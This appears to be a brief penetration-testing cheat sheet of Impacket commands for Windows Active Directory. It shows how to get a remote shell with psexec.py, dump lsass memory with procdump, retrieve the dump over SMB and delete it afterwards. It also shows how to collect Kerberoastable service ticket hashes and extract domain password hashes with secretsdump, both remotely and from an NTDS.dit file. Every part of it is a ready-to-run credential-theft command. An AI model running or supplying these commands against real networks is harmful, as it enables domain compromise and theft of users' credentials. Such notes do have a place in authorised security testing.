# impacket

## psexec.py

Get a cmd:

``` bash
psexec.py "$domain/$domuser:$userpassword@$cible"
```

Execute remote commands (procdump is local in the current working directory, and will automatically be sent by psexec to the remote system for execution):

``` bash
psexec.py -c procdump.exe "$domain/$domuser:$userpassword@$cible" "-acceptEula -ma lsass.exe C:/windows/lsass.dmp"
smbget -w $domain -U $domuser%$userpassword smb://$cible/ADMIN$/lsass.dmp
psexec.py "$domain/$domuser:$userpassword@$cible" "del C:/windows/lsass.dmp"
```


## GetUserSPNs.py

``` bash
GetUserSPNs.py -dc-ip 192.168.1.1 contoso.local/jdupond:'P@$$w0rd' -outputfile "kerberoast_contoso.local_13100.hash"
```

## secretsdump.py

Remotely:

``` bash
secretsdump.py -just-dc -user-status -history contoso.local/Administrator:'P@$$w0rd'@192.168.1.1 | tee secretsdump_contoso.local_192.168.1.1.txt
```

Locally:

``` bash
secretsdump.py -user-status -history -system SYSTEM -ntds ntds.dit local | tee secretsdump_contoso.local_local.txt
```
